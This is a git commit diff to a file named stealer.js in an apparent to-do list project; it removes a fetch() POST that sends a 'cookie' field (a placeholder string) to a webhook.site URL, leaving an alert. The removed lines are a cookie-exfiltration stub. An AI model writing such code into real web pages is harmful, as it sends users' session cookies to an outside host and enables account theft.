e61c95b0c694f8b539ea8431ccf55a556730bedc
CodeOfMuscles <146719124+CodeOfMuscles@users.noreply.github.com>
2024-09-06 09:55:53 +0200

    Update stealer.js

--- To-Do-List-Tool/stealer.js
+++ To-Do-List-Tool/stealer.js
@@ -1,15 +1,2 @@
-// Sending a POST request using fetch
-fetch('https://webhook.site/f21dc15a-d8b4-468b-9221-60fd48267bcc', {
-    method: 'POST', // or 'GET', depending on what you want to do
-    headers: {
-        'Content-Type': 'application/json', // Adjust as needed
-    },
-    body: JSON.stringify({
-        cookie: "ahmed",
-    }) // The data you want to send in the request body
-})
-// .then(response => response.text()) // Can also use .json() if expecting JSON response
-// .then(data => console.log('Success:', data))
-// .catch(error => console.error('Error:', error));
 
 alert("smil");
